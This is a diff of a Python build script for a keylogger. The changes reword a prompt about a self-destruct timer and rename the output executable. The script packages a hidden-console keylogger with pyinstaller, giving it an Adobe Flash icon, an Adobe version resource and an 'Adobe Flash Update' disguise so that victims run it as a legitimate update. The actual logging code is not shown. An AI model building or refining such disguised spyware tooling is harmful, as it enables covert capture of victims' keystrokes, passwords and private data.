@@ -24,7 +24,7 @@ passd =  getpass(BLUE + 'Enter your password: ' + END)
 
 chk = input(BLUE + "\nDo you want to add self-destruction [y/n] \n" + header + END)
 if chk == "y" or chk == "Y":
-    days = int(input(BLUE + "No. of days after you want this keylogger to self-destruct (ex. 2) \n" + header + END))
+    days = int(input(BLUE + "Number of days after you want the keylogger to self-destruct (ex. 2) \n" + header + END))
     if days <= 0:
         print("Days should be greater than 0") 
         sys.exit()   
@@ -49,7 +49,7 @@ print ('\n {0}[{1}1{0}]{1} Adobe Flash Update '.format(BLUE, WHITE) + '\n' + ' {
 choice = input(header)
 
 if choice == '1':
-    name = 'abs_Flash.exe'
+    name = 'log_Flash.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/adobe.ver -i Icons/flash.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
